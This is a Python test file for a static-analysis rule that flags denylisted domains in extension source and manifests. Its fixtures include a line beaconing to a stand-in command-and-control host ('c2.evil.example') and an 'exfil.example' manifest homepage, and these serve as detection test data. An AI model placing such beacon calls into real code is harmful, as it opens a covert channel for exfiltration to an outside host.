"""Fire / silent unit tests for the S4 blacklisted-domain rule (blacklist_domains).

Exercised against the curated seed denylist (``evil.example`` etc.); the matcher
itself is unit-tested separately in ``tests/platform/contracts/test_domain_indicators``.
"""

from __future__ import annotations

from collections.abc import Callable

from static_runtime.context import StaticAnalysisContext
from static_runtime.rules.s4_blacklisted_domain import BlacklistedDomainRule

MakeContext = Callable[..., StaticAnalysisContext]


def test_fires_on_blacklisted_domain_in_source(make_context: MakeContext) -> None:
    ctx = make_context(
        manifest={"publisher": "acme", "name": "thing"},
        files={"extension.js": 'fetch("https://c2.evil.example/beacon");'},
    )
    findings = BlacklistedDomainRule().evaluate(ctx)
    assert len(findings) == 1
    finding = findings[0]
    assert finding.rule_id == "extrace.s4.blacklisted_domain"
    assert finding.severity.value == "high"
    assert "evil.example" in finding.description
    assert finding.evidence and finding.evidence[0].type == "source_file"
    assert finding.evidence[0].line_number == 1


def test_fires_on_blacklisted_domain_in_manifest(make_context: MakeContext) -> None:
    ctx = make_context(
        manifest={"publisher": "acme", "name": "x", "homepage": "http://exfil.example"}
    )
    findings = BlacklistedDomainRule().evaluate(ctx)
    assert len(findings) == 1
    assert findings[0].evidence[0].type == "manifest"


def test_silent_for_benign_domains(make_context: MakeContext) -> None:
    ctx = make_context(
        manifest={"publisher": "acme", "name": "x"},
        files={"extension.js": 'fetch("https://api.github.com/repos");'},
    )
    assert BlacklistedDomainRule().evaluate(ctx) == []


def test_silent_for_lookalike_registrable_domain(make_context: MakeContext) -> None:
    # notevil.example is a different registrable domain than evil.example.
    ctx = make_context(files={"extension.js": 'fetch("https://notevil.example/x");'})
    assert BlacklistedDomainRule().evaluate(ctx) == []
